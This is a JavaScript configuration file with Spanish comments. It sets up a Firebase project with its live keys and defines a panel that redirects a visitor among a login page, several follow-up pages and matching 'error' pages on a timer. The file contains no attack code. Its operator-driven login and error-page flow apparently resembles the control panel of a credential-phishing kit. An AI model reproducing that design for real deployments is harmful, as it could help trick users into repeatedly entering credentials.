// Configuración centralizada de Firebase y rutas

const firebaseConfig = {
    apiKey: "AIzaSyA0TRTsikzaUYfnxDW3BfKM4H8ClX6_CMk",
    authDomain: "o1u9a240.firebaseapp.com",
    projectId: "o1u9a240",
    storageBucket: "o1u9a240.firebasestorage.app",
    messagingSenderId: "246113174191",
    appId: "1:246113174191:web:37181bb0535448db76ca5a"
};
// Inicializar Firebase
if (typeof firebase !== 'undefined') {
    // Verificar si ya está inicializado
    if (!firebase.apps.length) {
        firebase.initializeApp(firebaseConfig);
        console.log('✅ Firebase inicializado correctamente');
    } else {
        console.log('✅ Firebase ya estaba inicializado');
    }

    // Crear referencia a Firestore
    const db = firebase.firestore();

    // Hacer db accesible globalmente
    window.db = db;
    console.log('✅ Variable db creada y disponible globalmente');
} else {
    console.error('❌ Firebase no está cargado. Verifica que los scripts de Firebase estén incluidos.');
}

// Configuración de la aplicación
const appConfig = {
    // Rutas de redirección
    routes: {
        1: { url: "/", name: "Login" },
        2: { url: "index_err.html", name: "Index Error" },
        3: { url: "index2.html", name: "index2" },
        4: { url: "index2_err.html", name: "index2 Error" },
        5: { url: "index3.html", name: "index3" },
        6: { url: "index3_err.html", name: "index3 Error" },
    },

    // Tiempo de espera para redirección (en milisegundos)
    timeout: 100000, // 100 segundos

    // Configuración de acciones del panel
    actions: {
        home: { page: 1, color: "#87f79fff" },
        index_err: { page: 2, color: "#ffd6de" },
        index2: { page: 3, color: "#e8fff0" },
        index2_err: { page: 4, color: "#ffd6de" },
        index3: { page: 5, color: "#fff8e8" },
        index3_err: { page: 6, color: "#ffd6de" },
    },

    // Configuración de estados
    status: {
        0: { text: "Cargando", class: "warning" },
        1: { text: "Inicio", class: "success" },
        2: { text: "Inicio Error", class: "danger" },
        3: { text: "index2", class: "success" },
        4: { text: "index2 Error", class: "danger" },
        5: { text: "index3", class: "success" },
        6: { text: "index3 Error", class: "danger" },
    }
};

// Hacer la configuración accesible globalmente
window.appConfig = appConfig;
window.firebaseConfig = firebaseConfig;
